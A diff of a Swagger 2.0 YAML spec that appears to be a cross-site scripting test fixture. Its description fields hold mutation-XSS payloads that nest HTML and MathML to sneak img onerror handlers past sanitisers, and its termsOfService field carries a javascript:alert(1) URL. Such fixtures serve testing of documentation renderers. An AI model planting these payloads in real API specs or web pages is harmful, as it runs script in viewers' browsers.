@@ -2,31 +2,18 @@ swagger: '2.0'
 info:
   title: Example YAML.spec
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=prompt('XSS TRIGGERED') src=1>"></form>
-  termsOfService: "http://169.38.106.74/48ag25vkwf7x151kd3tl7xf5rwxnle93"
-version: production
-basePath: /JSSResource/
-produces:
-- application/xml
-- application/json
+     <math><foo-test><mi><li><table><foo-test><li></li></foo-test>a<a><style><!--</style>a<foo-bar is="--><img src=x onerror=alert(1)>">
+  termsOfService: "javascript:alert(1)"
 paths:
   /phished:
     get:
     responses:
     '200':
     description: No response was specified
-  tags:
-  - accounts
-  operationId: findAccounts
-  summary: Finds all accounts
-
-
-
-
-
-
-
-
+    tags:
+    - accounts
+    operationId: findAccounts
+    summary: Finds all accounts
 
 
 
